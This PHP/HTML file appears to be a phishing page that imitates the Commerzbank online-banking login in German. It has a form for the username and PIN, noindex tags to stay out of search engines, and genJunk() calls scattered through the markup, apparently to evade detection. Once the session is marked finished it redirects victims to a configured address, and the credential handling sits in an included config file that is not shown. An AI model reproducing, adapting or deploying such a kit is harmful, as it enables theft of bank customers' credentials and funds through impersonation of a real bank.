<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: ' .  $redirect);
	}
?>
<!DOCTYPE html>
<html dir="ltr" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths win firefox firefox50 gecko gecko50 details" style="" lang="de">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Anmeldung zum Online Banking - Commerzbank</title>
		<link rel="shortcut icon" href="src/coba_img/favicon.ico" type="image/x-icon">
		<link href="src/coba_css/main.css" rel="stylesheet">
		<link href="src/coba_css/main_ext.css" rel="stylesheet">
		<link href="src/coba_css/header_login.css" rel="stylesheet">
		<link rel="stylesheet" href="src/coba_css/cms.css" type="text/css">
		<script src="src/coba_js/jquery-1.js"></script>
		<script src="src/coba_js/jquery_ui.js"></script>
		<script src="src/coba_js/lib_head.js"></script>
		<script src="src/coba_js/lib_head_ext.js"></script>
	</head>
	<body data-viewport="largeViewport">
		<header style="height: 142px;">
			<?php echo genJunk() ?><div class="wrapper-meta">
				<?php echo genJunk() ?><div class="mod mod-Suche">
					<form method="post" action="" name="searchform">
						<input class="f-if-01" name="SucheISDirekt" placeholder="Ihr Suchtext" required="" type="search">
						<button class="f-sf-01" type="submit">Suche</button>
					</form>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="mod mod-NavMeta" style="margin-right: 60px; width: auto;">
					<ul>
					<li>
					<a href="" target="coba" class="mn-01">Konzern</a>
					</li>
					<li>
					<a href="" class="mn-01">English</a>
					</li>
					</ul>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
			
			<?php echo genJunk() ?><div class="wrapper-sparten">
				<?php echo genJunk() ?><div class="mod mod-Logo">
					<a href="">
						<img src="src/coba_img/logo_big_svg.svg" class="logo" width="228" height="30">
					</a>
				</div><?php echo genJunk() ?>
				<nav class="mod mod-NavSparten">
					<ul>
					<li class="active">
					<a href="">Privatkunden</a>
					</li>
					<li class="">
					<a href="">Geschäftskunden</a>
					</li>
					<li><a href="" target="cobafk">Firmenkunden</a></li>
					</ul>
				</nav>	
			</div><?php echo genJunk() ?>

			<nav class="mod mod-NavHaupt">
				<?php echo genJunk() ?><div class="yellow-bar">&nbsp;</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="inner">
					<?php echo genJunk() ?><div class="menubar-wrapper" style="left: auto; width: auto; height: auto;">
						<ul class="menubar">
							<li class="hn-01 hasSubNav">
							<a href="#" data-nav-href=""><span>Persönlicher Bereich</span></a>
							</li>
							<li class="hn-02 hasSubNav">
							<a href="#" data-nav-href=""><span>Produkte</span></a>
							</li>
							<li class="hn-02 hasSubNav">
							<a href="#" data-nav-href=""><span>Beratung</span></a>
							</li>
							<li class="hn-02 hasSubNav">
							<a href="#" data-nav-href=""><span>Wertpapiere &amp; Märkte</span></a>
							</li>
							<li class="hn-02 hasSubNav">
							<a href="#" data-nav-href=""><span>Service &amp; Hilfe</span></a>
							</li>
							<li class="hn-02 hasSubNav iconTiles">
							<a href="#" data-nav-href=""><span>Kontakt</span></a>
							</li>
						</ul>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</nav>
		</header>
  
		<?php echo genJunk() ?><div class="main" role="main">
			<section class="content">
				<p class="printButton"></p>
				<p class="helpButton"></p>
				<?php echo genJunk() ?><div class="row sc-01">
					<?php echo genJunk() ?><div class="col col-lg-12">
						<?php echo genJunk() ?><div class="mod mod-Login">
							<?php echo genJunk() ?><div class="mod mod-Headline">
								<h1 class="h-01">
									Anmeldung für Online Banking
								</h1>
							</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div class="row ac-6_6">
								<?php echo genJunk() ?><div class="col col-lg-6">
									<?php echo genJunk() ?><div class="login-box">
										<form action="index.php" method="post" class="loginFormCss" id="id1" data-h5-instanceid="0" novalidate="novalidate">
											<?php echo genJunk() ?><div class="form-row label-pos-none field-length-full">
												<label for="teilnehmer">Label</label>
												<?php echo genJunk() ?><div class="input">
													<input class="text-left required" required="required" id="teilnehmer" name="cb_username" value="<?php echo (isset($_SESSION['cb_username']) ? $_SESSION['cb_username'] : ""); ?>" 
													autocomplete="off" maxlength="50" tabindex="1" autofocus="" data-h5-errorid="invalid-teilnehmer" placeholder="Benutzername/Teilnehmernummer" pattern="(?=(([0-9]+[^0-9]+)|([a-zA-Z]+[^a-zA-Z]+)|([@._\-]+[^@._\-]+)))[a-zA-Z0-9.@_\-]{8,50}|[0-9]{8}|[0-9]{10}" type="text">

													<?php echo genJunk() ?><div class="error-msg" id="invalid-teilnehmer" style="display: <?php echo (isset($_SESSION['user_err']) ? "block" : "none"); unset($_SESSION['user_err']); ?>;">
														<?php echo genJunk() ?><div class="inner">
															<p>
																Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer
			 oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.
															</p>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
												<a href="#useridInfo" class="info-box-link"></a>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="info-box-msg" id="useridInfo">
												<?php echo genJunk() ?><div class="inner">
													<p>
														<b>Benutzername (Alias)</b><br>Der Benutzername ist eine von 
			Ihnen frei wählbare Zugangskennung. Diese können Sie nach jeder 
			erfolgreichen Anmeldung vergeben, ändern oder löschen. Nach Vergabe 
			eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder 
			der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) möglich.<br><br>Sollten
			 sie Ihren Benutzernamen vergessen, können Sie sich jederzeit mit Ihrer 
			10-stelligen Teilnehmernummer (Banking-ID) anmelden und den 
			Benutzernamen in der Rubrik "Persönlicher Bereich" unter dem Punkt 
			"Verwaltung/Online Zugang" mit der Funktion "Benutzername ändern" 
			ersehen und ggf. ändern.<br><br><b>Teilnehmernummer (Banking-ID)</b><br>Unter
			 der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale 
			vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 
			10-stellig und losgelöst von Ihrer Kontonummer. Die Teilnehmernummer 
			können Sie sich jederzeit in der Rubrik "Persönlicher Bereich" unter dem
			 Punkt "Verwaltung/Online Zugang" mit der Funktion "Benutzername ändern"
			 anzeigen lassen.
													</p>
												</div><?php echo genJunk() ?>
												<span class="close">x</span>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="form-row  label-pos-none field-length-full">
												<label for="pin">Label</label>
												<?php echo genJunk() ?><div class="input">
													<input class="text-left" required="required" id="cb_password" name="cb_password" autocomplete="off" maxlength="8" tabindex="2" data-h5-errorid="invalid-pin" value="" placeholder="PIN" pattern="[A-Za-z0-9]{5,8}" type="password">

													<?php echo genJunk() ?><div class="error-msg" id="invalid-pin" style="display: <?php echo (isset($_SESSION['pass_err']) ? "block" : "none"); unset($_SESSION['pass_err']); ?>;">
														<?php echo genJunk() ?><div class="inner">
															<p>
																Geben Sie bitte min. 5 bis max. 8 Buchstaben bzw. Ziffern ein.
															</p>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
												<a href="#pinInfo" class="info-box-link"></a>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="info-box-msg" id="pinInfo">
												<?php echo genJunk() ?><div class="inner">
													<p>
														<b>PIN</b><br>Bitte geben Sie in dieses Feld Ihre 5 bis 8-stellige PIN - Persönliche Identifikationsnummer ein.<br>Sie
			 erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von
			 Ihrer Commerzbank Filiale. Eine Änderung Ihrer PIN ist unter Verwendung
			 einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Persönlicher 
			Bereich" unter dem Punkt "Verwaltung/Online Zugang" mit der Funktion 
			"PIN ändern" möglich.
													</p>
												</div><?php echo genJunk() ?>
												<span class="close">x</span>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="form-row label-pos-none field-length-full">
												<label for="s2id_autogen1">Label</label>
												<?php echo genJunk() ?><div class="input">
													<?php echo genJunk() ?><div class="select2-container dd-01" id="s2id_startSite">
														<a href="javascript:void(0)" onclick="return false;" class="select2-choice" tabindex="-1">   <span class="select2-chosen">Meine Startseite</span><abbr class="select2-search-choice-close"></abbr>   <span class="select2-arrow"><b></b></span></a>
														<input class="select2-focusser select2-offscreen" id="s2id_autogen1" tabindex="3" type="text">
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
											</div><?php echo genJunk() ?>
											<button id="loginFormSubmit" name="sendOB_Login_x" class="b-01 b-a-04 b-g-01 login" type="submit" tabindex="4">
												Jetzt anmelden
											</button>
										</form>
										<?php echo genJunk() ?><div>
											<?php echo genJunk() ?><div class="mod mod-TextBild af-a-06">
												<h3 class="h-03"> Aktuelle Warnhinweise </h3>
												<?php echo genJunk() ?><div class="content">
													<ul class="ll">
														<li>
														<a class="l-p-02" href="#">Warnung vor Phishing mit Aufforderung zum Upload der TAN-Liste </a>
														</li>
														<li>
														<a class="l-p-02" href="#">Rücküberweisungstrojaner</a>
														</li>
														<li>
														<a class="l-p-02" href="#">Abfragen von mehreren iTANs</a>
														</li>
													</ul>
												</div><?php echo genJunk() ?>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="col col-lg-6">
									<?php echo genJunk() ?><div>
										<?php echo genJunk() ?><div class="mod mod-TextBild af-a-04">
											<h3 class="h-03"> Wichtige Infos zum Online Banking </h3>
											<?php echo genJunk() ?><div class="content">
												<p class="p-02">Noch kein Online Banking Kunde?<br>
												</p>
												<ul class="ll">
												<li>
												<a class="l-p-02" href="">Zugang beantragen</a>
												</li>
												</ul>
												<p class="p-02"><br>Teilnehmernummer vergessen? <br>
												</p>
												<ul class="ll">
												<li>
												<a class="l-p-02" href="" title="Formular">Neu anfordern</a>
												</li>
												</ul>
												<p class="p-02"><br>Alles rund ums Online Banking<br>
												</p>
												<ul class="ll">
												<li>
												<a class="l-p-02" href="#" onclick="" title="Hilfe-Übersicht">Anleitung/Hilfe</a>
												</li>
												</ul>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
									<p></p>
									<?php echo genJunk() ?><div></div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div></div><?php echo genJunk() ?>
				<p></p>
			</section>
		</div><?php echo genJunk() ?>  
		
		<footer>
			<?php echo genJunk() ?><div class="mod mod-NavFooter">
			<ul>
			<li>
			<a href="#" class="fn-01">AGB</a>
			</li>
			<li>
			<a href="#" class="fn-01">Preise &amp; Konditionen</a>
			</li>
			<li>
			<a href="#" class="fn-01">Sicherheit</a>
			</li>
			<li>
			<a href="#" class="fn-01">Impressum</a>
			</li>
			<li>
			<a href="#" class="fn-01">Rechtliche Hinweise</a>
			</li>
			<li>
			<a href="#" class="fn-01">Newsletter</a>
			</li>
			<li>
			<a href="#" class="fn-01">Sitemap</a>
			</li>
			</ul>
			</div><?php echo genJunk() ?>
		</footer>
		<script src="src/coba_js/lib_main.js"></script>
		<script src="src/coba_js/lib_main_ext.js"></script>
		<script src="src/coba_js/lib_cms.js"></script> 
		<script src="src/coba_js/lib_cms_ext.js"></script> 
		<script src="src/coba_js/lib_header_login.js"></script>	
		<script src="src/coba_js/html5shiv-printshiv.js"></script>
	</body>
</html>